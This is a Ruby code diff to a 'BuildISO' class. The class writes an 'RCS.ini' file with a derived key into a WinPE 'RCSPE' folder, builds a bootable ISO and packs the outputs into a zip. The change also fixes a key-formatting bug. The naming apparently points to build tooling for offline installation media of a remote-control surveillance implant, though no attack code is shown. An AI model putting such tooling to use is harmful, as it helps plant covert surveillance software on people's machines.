@@ -25,6 +25,8 @@ class BuildISO < Build
   def generate(params)
     trace :debug, "Build: generate: #{params}"
 
+    names = {}
+    
     params['platforms'].each do |platform|
       build = Build.factory(platform.to_sym)
 
@@ -44,8 +46,8 @@ class BuildISO < Build
       build.clean
     end
 
-    key = @factory.logkey[0]
-    key = "%02X" % (key > 127) ? (key - 256) : key
+    key = @factory.logkey.chr.ord
+    key = "%02X" % ((key > 127) ? (key - 256) : key)
         
     # write the ini file
     File.open(path('winpe/RCSPE/RCS.ini'), 'w') do |f|
@@ -64,11 +66,8 @@ class BuildISO < Build
       f.puts "HKEY=#{key}"
     end
 
-    puts File.read(path('winpe/RCSPE/RCS.ini'))
-    #system "ls -laR #{@tmpdir}"
-
     # create the ISO image
-    CrossPlatform.exec path('oscdimg'), "-u1 -l#{@factory.ident} -b#{path('winpe/boot/etfsboot.com').gsub("/", '\\')} #{path('winpe').gsub("/", '\\')} #{path('output.iso').gsub("/", '\\')}"
+    CrossPlatform.exec path('oscdimg'), "-u1 -l#{@factory.ident} -b#{path('winpe/boot/etfsboot.com')} #{path('winpe')} #{path('output.iso')}"
     raise "ISO creation failed" unless File.exist? path('output.iso')
 
     @outputs = ['output.iso']
@@ -76,6 +75,15 @@ class BuildISO < Build
 
   def pack(params)
     trace :debug, "Build: pack: #{params}"
+
+    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
+      @outputs.each do |out|
+        z.file.open(out, "w") { |f| f.write File.open(path(out), 'rb') {|f| f.read} }
+      end
+    end
+
+    # this is the only file we need to output after this point
+    @outputs = ['output.zip']
   end
 
   def deliver(params)
